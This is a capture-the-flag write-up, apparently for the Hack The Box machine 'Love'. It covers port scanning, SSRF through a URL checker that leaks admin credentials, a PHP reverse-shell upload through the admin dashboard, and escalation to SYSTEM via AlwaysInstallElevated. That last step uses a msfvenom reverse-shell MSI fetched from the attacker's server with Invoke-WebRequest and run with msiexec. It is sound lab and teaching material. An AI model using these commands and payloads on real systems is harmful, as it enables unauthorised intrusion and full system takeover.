## --------->> Love <<-----------

// We start with nmap scan 

    $ nmap -sV -A -Pn 10.10.10.239 -p-
-----

    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 15:17 EDT
    Nmap scan report for 10.10.10.239
    Host is up (0.29s latency).
    Not shown: 65516 closed ports
    PORT      STATE SERVICE      VERSION
    80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
    |_http-title: Voting System using PHP
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
    |_http-title: 403 Forbidden
    | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
    | Not valid before: 2021-01-18T14:00:16
    |_Not valid after:  2022-01-18T14:00:16
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |_  http/1.1
    445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
    3306/tcp  open  mysql?
    | fingerprint-strings: 
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LPDString, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, X11Probe: 
    |_    Host '10.10.16.238' is not allowed to connect to this MariaDB server
    5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
    |_http-title: 403 Forbidden
    5040/tcp  open  unknown
    5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    | ssl-cert: Subject: commonName=LOVE
    | Subject Alternative Name: DNS:LOVE, DNS:Love
    | Not valid before: 2021-04-11T14:39:19
    |_Not valid after:  2024-04-10T14:39:19
    |_ssl-date: 2021-07-10T20:10:04+00:00; +32m46s from scanner time.
    | tls-alpn: 
    |_  http/1.1
    7680/tcp  open  pando-pub?
    47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    49664/tcp open  msrpc        Microsoft Windows RPC
    49665/tcp open  msrpc        Microsoft Windows RPC
    49666/tcp open  msrpc        Microsoft Windows RPC
    49667/tcp open  msrpc        Microsoft Windows RPC
    49668/tcp open  msrpc        Microsoft Windows RPC
    49669/tcp open  msrpc        Microsoft Windows RPC
    49670/tcp open  msrpc        Microsoft Windows RPC

    Host script results:
    |_clock-skew: mean: 2h17m46s, deviation: 3h30m01s, median: 32m45s
    | smb-os-discovery: 
    |   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
    |   OS CPE: cpe:/o:microsoft:windows_10::-
    |   Computer name: Love
    |   NetBIOS computer name: LOVE\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2021-07-10T13:09:46-07:00
    | smb-security-mode: 
    |   account_used: <blank>
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2021-07-10T20:09:44
    |_  start_date: N/A

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 1193.79 seconds
    
    
// We got a lot of info. lets first check web page (Port:80) Navigate in browser to http://10.10.10.239/

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Love/1.png)

// Lets search for interesting directories in the website, for that we will use tool called ![dirsearch.py](https://github.com/maurosoria/dirsearch)

    $ python3 dirsearch.py -u http://10.10.10.239/ -i 100-400 -t 150
-----

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 150 | Wordlist size: 10903

    Output File: /home/kali/Desktop/Tools/dirsearch/reports/10.10.10.239/_21-08-04_05-13-01.txt

    Error Log: /home/kali/Desktop/Tools/dirsearch/logs/errors-21-08-04_05-13-01.log

    Target: http://10.10.10.239/

    [05:13:01] Starting: 
    [05:13:12] 301 -  337B  - /ADMIN  ->  http://10.10.10.239/ADMIN/
    [05:13:12] 301 -  337B  - /Admin  ->  http://10.10.10.239/Admin/
    [05:13:20] 301 -  337B  - /admin  ->  http://10.10.10.239/admin/
    [05:13:20] 200 -    6KB - /admin%20/
    [05:13:20] 301 -  338B  - /admin.  ->  http://10.10.10.239/admin./
    [05:13:20] 200 -    6KB - /admin/
    [05:13:20] 200 -    6KB - /admin/?/login
    [05:13:21] 200 -    6KB - /admin/index.php
    [05:13:21] 302 -    0B  - /admin/login.php  ->  index.php
    [05:13:21] 302 -   16KB - /admin/home.php  ->  index.php
    [05:13:31] 301 -  348B  - /bower_components  ->  http://10.10.10.239/bower_components/
    [05:13:32] 200 -    7KB - /bower_components/
    [05:13:37] 301 -  336B  - /dist  ->  http://10.10.10.239/dist/
    [05:13:37] 200 -    1KB - /dist/
    [05:13:41] 302 -    0B  - /home.php  ->  index.php
    [05:13:42] 301 -  338B  - /images  ->  http://10.10.10.239/images/
    [05:13:42] 200 -    2KB - /images/
    [05:13:42] 200 -    2KB - /includes/
    [05:13:42] 301 -  340B  - /includes  ->  http://10.10.10.239/includes/
    [05:13:42] 200 -    4KB - /index.php/login/
    [05:13:42] 200 -    4KB - /index.php
    [05:13:45] 302 -    0B  - /login.php  ->  index.php
    [05:13:46] 302 -    0B  - /logout.php  ->  index.php
    [05:13:53] 301 -  339B  - /plugins  ->  http://10.10.10.239/plugins/
    [05:13:53] 200 -    2KB - /plugins/

    Task Completed


// We got some intersting directories, but didnt get a lot out of them...

// Moving on... 

// in nmap scan we got a subdomain 

    ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
    
// lets add him to /etc/hosts

    $ sudo nano /etc/hosts
-----

    $ cat /etc/hosts
    10.10.10.239	staging.love.htb

// Navigating to http://staging.love.htb/ present us a File checker website 

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Love/2.png)

// Clicking on the demo button on the top present us a tab when we can insert a url for check

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Love/3.png)

// inserting http://10.10.10.239/ to the tab, its seems that it represent us with the page content

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Love/4.png)

// since we know there is a http service running on port 5000 and his status code is 403(Forbbiden)

// lets try to see the site content with that url checker

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Love/5.png)

// not much, but, remember that we run on the subdomain so change the url to http://localhost:5000/ or http://127.0.0.1:5000/ (Loopback)

![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Love/6.png)

// We got admin credentials !!!

    admin : @LoveIsInTheAir!!!!

// Trying to login at http://10.10.10.239/ didnt work 

// So, we remeber(from directory search) that there is a directory called http://10.10.10.239/admin/

// Trying login again, and it worked !, we represented with the 'vote website' admin dashboard

![Image 7](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Love/7.png)

// Digging in the deshboard i notice there is a option to update admins picture

// click on the admin picture on the top >> click 'Update'

![Image 8](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Love/8.png)

// Then we have a upload button

![Image 9](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Love/9.png)

// Download a PHP reverse shell from [here](https://www.revshells.com) with recipe 'PHP Ivan Sincek'(for Windows)

![Image 10](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Love/10.png)

// Open a listiner with nc and upload the file

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.17.8] from (UNKNOWN) [10.10.10.239] 62160
    SOCKET: Shell has connected! PID: 2824
    Microsoft Windows [Version 10.0.19042.867]
    (c) 2020 Microsoft Corporation. All rights reserved.

    C:\xampp\htdocs\omrs\images> whoami
    love\phoebe

// We got user flag !!!

    C:\Users\Phoebe\Desktop> type user.txt
    5a55228............................

### -----Privilleges Escalation-----

// Lets Enumerate privilleges with [Winpeas tool](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe)

// We will upload the tool with python http server

    $ python3 -m http.server 1446

// Enter to powsershell on target and download winPEAS64.exe

    C:\Users\Phoebe\Desktop> powershell

-----

    PS C:\Users\Phoebe\Desktop> Invoke-WebRequest http://10.10.17.8:1446/winPEASx64.exe -OutFile C:\Users\Phoebe\Desktop\winPEASx64.exe
    
    PS C:\Users\Phoebe\Desktop> dir

    Directory: C:\Users\Phoebe\Desktop


    Mode                 LastWriteTime         Length Name                                                                 
    ----                 -------------         ------ ----                                                                 
    d-----          8/3/2021  11:46 PM                tmp                                                                  
    -ar---          8/3/2021   4:16 PM             34 user.txt                                                             
    -a----          8/3/2021  11:55 PM        1919488 winPEASx64.exe                                                       

// Running .\WinPEASx64.exe And the most relevant thing we see its [AlwaysInstallElevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated)

    PS C:\Users\Phoebe\Desktop>.\winPEASx64.exe
    ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD

                 *((,.,/((((((((((((((((((((/,  */               
          ,/*,..*((((((((((((((((((((((((((((((((((,           
        ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*       
        ((((((((((((((((**********/########## .(* ,(((((((   
        (((((((((((/********************/####### .(. (((((((
        ((((((..******************/@@@@@/***/###### ./(((((((
        ,,....********************@@@@@@@@@@(***,#### .//((((((
        , ,..********************/@@@@@%@@@@/********##((/ /((((
        ..((###########*********/%@@@@@@@@@/************,,..((((
        .(##################(/******/@@@@@/***************.. /((
        .(#########################(/**********************..*((
        .(##############################(/*****************.,(((
        .(###################################(/************..(((
        .(#######################################(*********..(((
        .(#######(,.***.,(###################(..***.*******..(((
        .(#######*(#####((##################((######/(*****..(((
        .(###################(/***********(##############(...(((
        .((#####################/*******(################.((((((
        .(((############################################(..((((
        ..(((##########################################(..(((((
        ....((########################################( .(((((
        ......((####################################( .((((((
        (((((((((#################################(../((((((
            (((((((((/##########################(/..((((((
                  (((((((((/,.  ,*//////*,. ./(((((((((((((((.
                     (((((((((((((((((((((((((((((/

    ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

        .......

    ����������͹ Checking AlwaysInstallElevated
    �  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
        AlwaysInstallElevated set to 1 in HKLM!
        AlwaysInstallElevated set to 1 in HKCU!

        .......


// According to [AlwaysInstallElevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated) if we have 2 enabled registry, then any user can install .msi file as NT/SYSTEM , Lets try this.

// First we will make .msi payload with 'MsfVenom' and call him 'reverse.msi'

    $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.8 LPORT=1447 -f msi -o reverse.msi

// We will upload 'reverse.msi' again with python and powershell

    $ python -m http.server 1447
-----

    PS C:\Users\Phoebe\Desktop> Invoke-WebRequest http://10.10.17.8:1446/reverse.msi -OutFile C:\Users\Phoebe\Desktop\reverse.msi
    PS C:\Users\Phoebe\Desktop> dir
    
    Directory: C:\Users\Phoebe\Desktop


    Mode                 LastWriteTime         Length Name                                                                 
    ----                 -------------         ------ ----                                                                 
    d-----          8/3/2021  11:46 PM                tmp                                                                  
    -a----          8/4/2021  12:38 AM         159744 reverse.msi                                                          
    -ar---          8/3/2021   4:16 PM             34 user.txt                                                             
    -a----          8/3/2021  11:55 PM        1919488 winPEASx64.exe                                                       


// Open a listiner and run the 'reverse.msi' with following command

    PS C:\Users\Phoebe\Desktop> msiexec /quiet /qn /i reverse.msi

// We got NT/SYSTEM !!!

    $ rlwrap nc -lvnp 1447
    listening on [any] 1447 ...
    connect to [10.10.17.8] from (UNKNOWN) [10.10.10.239] 62200
    Microsoft Windows [Version 10.0.19042.867]
    (c) 2020 Microsoft Corporation. All rights reserved.

    C:\WINDOWS\system32> whoami
    whoami
    nt authority\system

// We got root flag !

    C:\Users\Administrator\Desktop> type root.txt
    53c137f...................
